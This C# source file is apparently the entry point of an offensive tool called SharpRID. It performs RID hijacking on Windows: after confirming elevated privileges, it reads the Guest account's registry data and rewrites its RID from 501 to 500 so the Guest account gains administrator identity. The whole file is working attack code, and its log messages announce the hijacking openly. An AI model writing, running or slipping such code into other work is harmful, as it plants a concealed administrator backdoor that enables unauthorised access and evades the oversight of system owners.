using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using static SharpRID.Native.HelperClass;

namespace SharpRID
{
    class Program
    {
        static void Main(string[] args)
        {
            Native.HelperClass helper = new Native.HelperClass();
            helper.Printer(4, "Welcome Text");
            if (IsHighIntegrity() && IsLocalAdmin())
            {
                List<string> NewGuestRIDListValue = new List<string>();
                bool RIDReplace = false;
                helper.Printer(0, "Guest RID Hijacking Running.");
                byte[] GuestRIDHexValue = helper.RegistryGetter();
                string HexString = BitConverter.ToString(GuestRIDHexValue);
                List<string> GuestRIDListValue = HexString.Split('-').ToList();
                helper.Printer(0, "Guest RID Obtained.");

                foreach (var item in GuestRIDListValue)
                {
                    if (item == "F5")
                    {
                        NewGuestRIDListValue = GuestRIDListValue.Select(s => s.Replace("F5", "F4")).ToList();
                        RIDReplace = true;
                        helper.Printer(1, "Guest RID Changing...");
                    }
                }
                if (RIDReplace)
                {
                    byte[] NewGuestRIDHexValue = helper.StringToHex(NewGuestRIDListValue);
                    try
                    {
                        helper.RegistrySetter(NewGuestRIDHexValue);
                        helper.Printer(1, "Guest RID Changed.");
                    }
                    catch (Exception e)
                    {
                        helper.Printer(2, e.ToString());
                    }
                }
                else
                    helper.Printer(2, "Guest RID Not Changed ! Maybe Have Already Changed. ");
            }
            else
            {
                helper.Printer(3, "At Low Privileges, RID Hijacking Cannot Be Performed.");
            }
            Console.ReadKey();
        }
    }
}
